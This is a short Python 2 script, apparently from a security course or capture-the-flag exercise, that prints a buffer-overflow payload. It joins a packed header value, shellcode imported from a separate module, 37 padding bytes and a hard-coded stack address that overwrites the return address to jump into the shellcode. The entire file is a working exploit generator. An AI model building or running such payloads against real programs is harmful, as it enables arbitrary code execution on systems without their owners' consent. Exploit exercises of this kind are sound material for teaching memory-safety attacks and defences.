from shellcode import shellcode
from struct import pack

def main():
	print pack("<I", 0x40000000) + shellcode + "\x07"*37 + pack("<I", 0xbffe9410)

if __name__ == '__main__':
	main()
